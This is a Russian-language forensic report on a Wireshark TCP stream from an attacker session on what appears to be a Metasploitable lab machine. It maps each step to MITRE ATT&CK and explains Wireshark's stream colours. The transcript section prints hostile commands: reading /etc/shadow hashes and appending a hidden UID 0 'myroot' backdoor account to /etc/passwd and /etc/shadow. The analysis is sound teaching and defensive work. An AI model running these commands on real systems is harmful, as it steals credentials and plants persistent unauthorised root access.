# Отчёт анализа сеанса Wireshark

## 1. Что было обнаружено  
В расшифровке (`Follow → TCP Stream`) виден **полноценный интерактивный сеанс атакующего** на машине `metasploitable`:

| Шаг | Краткое описание | MITRE ATT&CK |
|-----|------------------|--------------|
| Получен root-шелл (`uid=0`) | Привилегии суперпользователя уже даны | T1059 CLI |
| Подготовка окружения (`nohup >/dev/null 2>&1`) | Скрыть вывод, обеспечить устойчивость | T1059 CLI |
| Проверка живости (`echo qeQCrFL4JOPD9Kzc`) | Маркер/«бейкон» для корреляции | — |
| Разведка (`whoami`, `hostname`, `ifconfig`) | Сбор сведений о системе и сети | T1033 / T1082 / T1049 |
| Дамп хешей (`cat /etc/shadow`) | Извлечение паролей | T1003 OS Credential Dumping |
| Назначение бэкдора (`myroot` в `/etc/passwd` и `/etc/shadow`) | Создана скрытая учётка UID 0 | T1098 / T1112 |
| Завершение (`exit`) | Сессионный «шум» минимизирован | — |

## 2. Что значат цвета в Wireshark (`Follow TCP Stream`)

| Цвет | Куда идёт трафик | В контексте сеанса |
|------|-----------------|---------------------|
| **Красный** | **Client → Server** | Вводимые злоумышленником команды (`SRC`) |
| **Синий** | **Server → Client** | Ответы системы на эти команды (`DST`) |
> **Примечание:** при большем количестве одновременных потоков Wireshark добавляет дополнительные цвета (зелёный, фиолетовый и т. д.), однако красный/синий остаются первой парой «запрос–ответ».

## 3. Детальная расшифровка (фрагмент)

> Красным — запросы (команды), синим — ответы.

```console
# root-access уже получен
uid=0(root) gid=0(root)

# подавление вывода
nohup  >/dev/null 2>&1

# однократный маркер
echo qeQCrFL4JOPD9Kzc
qeQCrFL4JOPD9Kzc

# подтверждение привилегий и разведка
whoami            → root
hostname          → metasploitable
ifconfig          → eth0 209.165.200.235/27 ...

# дамп хешей
cat /etc/shadow   → (список хешей)

# создание скрытого root-пользователя
echo "myroot::..." >> /etc/shadow
echo "myroot:x:0:0:root:/root:/bin/bash" >> /etc/passwd

# проверка
cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
myroot:x:0:0:root:/root:/bin/bash

# выход
exit
